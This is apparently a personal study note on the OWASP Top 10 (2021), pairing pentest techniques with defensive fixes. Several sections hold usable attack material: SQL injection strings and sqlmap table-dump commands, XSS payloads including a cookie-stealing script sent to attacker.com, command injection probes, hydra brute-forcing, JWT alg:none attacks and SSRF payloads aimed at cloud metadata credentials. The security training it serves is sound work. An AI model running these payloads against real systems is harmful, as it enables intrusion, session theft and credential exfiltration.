---
type: monograph
room: yellow
subject: "OWASP Top 10"
tags: [yellow/appsec, yellow/owasp]
date_updated: {{date}}
---

# AppSec — OWASP Top 10 (2021)

> [!quote]
> *"The game is afoot."* — Every vulnerability is a clue left by the developer.

**Reference:** [owasp.org/Top10](https://owasp.org/Top10/) | **Phase:** Secure Code Review, Pentest

The OWASP Top 10 is the baseline reference for web application security. Each entry covers: what it is, how to find it, how to exploit it (pentest), and how to fix it (defense).

---

## Quick Reference

| Rank | Name | CWE | Common In |
|------|------|-----|-----------|
| A01 | Broken Access Control | CWE-284 | All apps |
| A02 | Cryptographic Failures | CWE-327 | Auth, data storage |
| A03 | Injection | CWE-89, CWE-79 | DB-backed apps |
| A04 | Insecure Design | CWE-209 | Architectural flaws |
| A05 | Security Misconfiguration | CWE-16 | Cloud, frameworks |
| A06 | Vulnerable Components | CWE-1035 | All apps |
| A07 | Auth & Session Failures | CWE-287 | Login systems |
| A08 | Software & Data Integrity | CWE-829 | CI/CD, deserialisation |
| A09 | Logging & Monitoring Failures | CWE-778 | All apps |
| A10 | SSRF | CWE-918 | Cloud-facing apps |

---

## A01 — Broken Access Control

**What it is:** Users can act outside their intended permissions — viewing other users' data, escalating privileges, or accessing admin functions.

**Finding it:**
```bash
# IDOR — change numeric ID in URL/body
GET /api/users/1234/profile  → try /api/users/1235/profile

# Horizontal privilege test — log in as user A, capture user B's resource URL
# Change session cookie / JWT to user B's and replay

# Forced browsing — access admin paths without auth
curl -i https://target.com/admin/users
curl -i https://target.com/api/v1/admin/config

# Method tampering — endpoint allows GET but not POST on auth check
curl -X GET https://target.com/api/delete?id=1
```

**Tools:**
```bash
# Burp Suite — Autorize extension (auto-replaces session cookie)
# ffuf — brute-force admin paths
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/big.txt -mc 200,301

# Nuclei templates
nuclei -u https://target.com -t vulnerabilities/generic/
```

**Fix:**
```
✅ Deny by default — every endpoint checks permission explicitly
✅ Use server-side session for access checks (not client-supplied role/id)
✅ Log access control failures and alert on high rates
✅ Rate-limit API endpoints
✅ Use UUIDs instead of sequential numeric IDs (reduces IDOR enumeration)
```

---

## A02 — Cryptographic Failures

**What it is:** Sensitive data exposed due to missing, weak, or incorrectly implemented encryption.

**Finding it:**
```bash
# Check TLS version and cipher suite
nmap --script ssl-enum-ciphers -p 443 target.com
sslscan target.com
testssl.sh target.com

# Check for sensitive data in HTTP (not HTTPS)
curl -v http://target.com/login  # Should redirect to HTTPS

# Check response headers
curl -I https://target.com | grep -i "strict-transport\|content-security\|x-frame"

# Look for secrets in JS source
curl -s https://target.com/app.js | grep -iE "apikey|secret|password|token"
```

**Fix:**
```
✅ TLS 1.2+ only — disable TLS 1.0, 1.1, SSLv3
✅ HSTS header: Strict-Transport-Security: max-age=31536000; includeSubDomains
✅ Encrypt all PII/sensitive data at rest (AES-256)
✅ Hash passwords with bcrypt/Argon2 (not MD5/SHA1)
✅ Never store secrets in source code — use secret managers
```

---

## A03 — Injection

**What it is:** Untrusted data sent to an interpreter as part of a command or query.

### SQL Injection
```bash
# Detection
' OR '1'='1
' OR 1=1--
'; WAITFOR DELAY '0:0:5'--   # time-based blind (MSSQL)
' AND SLEEP(5)--              # time-based blind (MySQL)

# sqlmap — automated
sqlmap -u "https://target.com/item?id=1" --dbs
sqlmap -u "https://target.com/item?id=1" -D targetdb --tables
sqlmap -u "https://target.com/item?id=1" -D targetdb -T users --dump

# POST request
sqlmap -u "https://target.com/login" --data="user=admin&pass=test" -p user

# From Burp request file
sqlmap -r request.txt --level=5 --risk=3
```

### XSS (Cross-Site Scripting)
```bash
# Reflected XSS — inject into search/params
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><script>alert(document.cookie)</script>

# DOM-based — look in JavaScript source for
document.write(), innerHTML, eval(), location.href

# Steal cookies (if no HttpOnly)
<script>new Image().src='http://attacker.com/steal?c='+document.cookie;</script>

# Tools
dalfox url "https://target.com/search?q=test"   # fast XSS scanner
```

### Command Injection
```bash
# Test characters
; id
| id
&& id
`id`
$(id)

# Blind — time-based
; sleep 5
| ping -c 5 127.0.0.1
```

**Fix:**
```
✅ Parameterised queries / prepared statements (SQLi)
✅ Input validation — allowlist, not blocklist
✅ Output encoding (XSS) — context-aware (HTML, JS, URL)
✅ Content-Security-Policy header (XSS mitigation)
✅ Never pass user input to OS commands — use library functions
```

---

## A07 — Authentication & Session Failures

**What it is:** Broken authentication, weak session tokens, or missing session expiry.

**Finding it:**
```bash
# Default credential test
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# No brute-force protection — try 100 passwords without lockout
# Check: no rate limit, no CAPTCHA, no account lockout

# Weak session token
# Capture session cookie → decode base64 / check randomness
echo "dXNlcmlkPTEyMzQ=" | base64 -d   # userid=1234 — predictable!

# JWT attacks
# Check algorithm confusion (RS256 → HS256)
# Modify payload, re-sign with "none" algorithm
python3 jwt_tool.py <token> -X a    # alg:none attack
python3 jwt_tool.py <token> -T      # tamper mode
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt  # crack HS256

# Check for session fixation
# Set session cookie before login → session should regenerate after auth
```

**Fix:**
```
✅ MFA for all privileged and user-facing accounts
✅ Session tokens: cryptographically random, ≥128 bits
✅ Regenerate session ID after login
✅ Session expiry: idle (15–30 min), absolute (8–24 hrs)
✅ Secure + HttpOnly + SameSite=Strict cookie flags
✅ Rate-limit and lock out after N failed attempts
```

---

## A10 — Server-Side Request Forgery (SSRF)

**What it is:** Attacker causes server to make HTTP requests to internal/external resources.

**Finding it:**
```bash
# Look for URL parameters that fetch external content
?url=https://external.com
?image=http://...
?webhook=
?fetch=
?redirect=

# Test with Burp Collaborator or interactsh
?url=http://your-collaborator-id.burpcollaborator.net

# Cloud metadata SSRF (AWS)
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
?url=http://169.254.169.254/latest/user-data

# Azure
?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01

# GCP
?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# (requires Header: Metadata-Flavor: Google — test if server adds it)

# Bypass filters
?url=http://127.0.0.1/admin          # localhost
?url=http://[::1]/admin              # IPv6 localhost
?url=http://0.0.0.0/admin
?url=http://2130706433/admin         # decimal IP for 127.0.0.1
?url=http://evil.com@127.0.0.1/admin # authority confusion
```

**Fix:**
```
✅ Allowlist permitted destinations (not blocklist)
✅ Block requests to RFC1918 / link-local ranges (169.254.x.x, 10.x, 172.16-31.x, 192.168.x)
✅ Disable HTTP redirects on server-side fetch clients
✅ Use cloud IMDS v2 (requires PUT request token — prevents basic SSRF)
✅ Response should never echo raw upstream content back to attacker
```

---

## Related Notes

- [[AppSec - Secure Code Review]] ← Code review methodology
- [[AppSec - JWT & Auth]] ← Deep-dive on token attacks
- [[Yellow - Instruments]] ← Tool commands (semgrep, bandit, ZAP, nikto)

↩ [[Yellow - Monographs]] · [[Yellow]] · [[Mind Palace]]
